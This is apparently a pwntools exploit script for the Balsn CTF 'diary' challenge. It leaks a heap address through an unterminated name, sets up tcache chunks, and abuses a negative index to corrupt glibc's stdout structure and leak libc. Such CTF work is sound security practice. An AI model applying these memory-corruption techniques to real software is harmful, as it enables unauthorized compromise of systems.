#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        # Check this out!
        # diary.dbg: https://github.com/mephi42/dwarfexport/tree/vmlinux
        # api=True: https://github.com/Gallopsled/pwntools/pull/1695
        return gdb.debug(['./diary.dbg'], api=True)
    else:
        return remote('diary.balsnctf.com', 10101)


def send_int(tube, i):
    tube.send(f'{i:3}')


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.continue_nowait()

        # BUG: name without trailing \0.
        tube.recvuntil(b'What\'s your name : ')
        name = b'A' * 32
        tube.send(name)

        # tcache x7, victim x1, guard x1.
        chunk_header_size = 16
        chunk_data_size = 128
        tcache_idx = [0, 1, 2, 3, 4, 5, 6]
        victim_idx = 7
        for _ in range(10):
            tube.recvuntil(b'choice : ')
            send_int(tube, 2)  # Write Diary.
            tube.recvuntil(b'Diary Length : ')
            send_int(tube, chunk_data_size)
            tube.recvuntil(b'Diary Content : ')
            tube.send(b'A' * chunk_data_size)

        # Leak heap address.
        tube.recvuntil(b'choice : ')
        send_int(tube, 1)  # Show Name.
        tube.recvuntil(name)
        leak_suffix = b'\n===================='
        leak = tube.recvuntil(leak_suffix)
        page0, = struct.unpack(
            '<Q', leak[:-len(leak_suffix)].ljust(8, b'\0'))
        print(f'g.pages[0] = 0x{page0:x}')
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            gdb_page0 = tube.gdb.parse_and_eval('g.pages[0]') \
                .cast(tube.gdb.lookup_type('long'))
            assert gdb_page0 == page0
            tube.gdb.continue_nowait()

        # Data pointed to by page[victim_idx] contains a libc address.
        victim_addr = \
            page0 + (chunk_header_size + chunk_data_size) * victim_idx
        print(f'victim_addr = 0x{victim_addr:x}')
        for i in tcache_idx + [victim_idx]:
            tube.recvuntil(b'choice : ')
            send_int(tube, 5)  # Tear out page.
            tube.recvuntil(b'Page : ')
            send_int(tube, i)
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            gdb_victim_addr = \
                tube.gdb.parse_and_eval(f'g.pages[{victim_idx}]') \
                    .cast(tube.gdb.lookup_type('long'))
            assert gdb_victim_addr == victim_addr
            gdb_victim_q0 = tube.gdb.parse_and_eval(
                f'*(long *)g.pages[{victim_idx}]')
            assert 0x7f0000000000 <= gdb_victim_q0 < 0x800000000000
            tube.gdb.continue_nowait()

        # Corrupt stdout.
        tube.recvuntil(b'choice : ')
        send_int(tube, 4)  # Edit Diary.
        tube.recvuntil(b'Page : ')
        send_int(tube, -8)  # BUG: stdout.
        tube.recvuntil(b'Content : ')
        tube.send(struct.pack(
            '<IQQQQQQQQ',
            # _flags: overlapped by len, not touched.
            0,  # hole.
            victim_addr,  # _IO_read_ptr.
            victim_addr,  # _IO_read_end.
            victim_addr,  # _IO_read_base.
            victim_addr,  # _IO_write_base.
            victim_addr + 8,  # _IO_write_ptr.
            victim_addr + 8,  # _IO_write_end.
            victim_addr,  # _IO_buf_base.
            victim_addr + 8,  # _IO_buf_end.
        ))

        # Leak libc address.
        leak_suffix = b'===================='
        leak = tube.recvuntil(leak_suffix)
        victim_q0, = struct.unpack(
            '<Q', leak[:-len(leak_suffix)])
        print(f'victim_q0 = 0x{victim_q0:x}')
        if args.LOCAL:
            assert gdb_victim_q0 == victim_q0
        libc_addr = victim_q0 - 0x1e4ca0
        print(f'libc_addr = 0x{libc_addr:x}')
        assert libc_addr & 0xfff == 0

        tube.interactive()


if __name__ == '__main__':
    main()
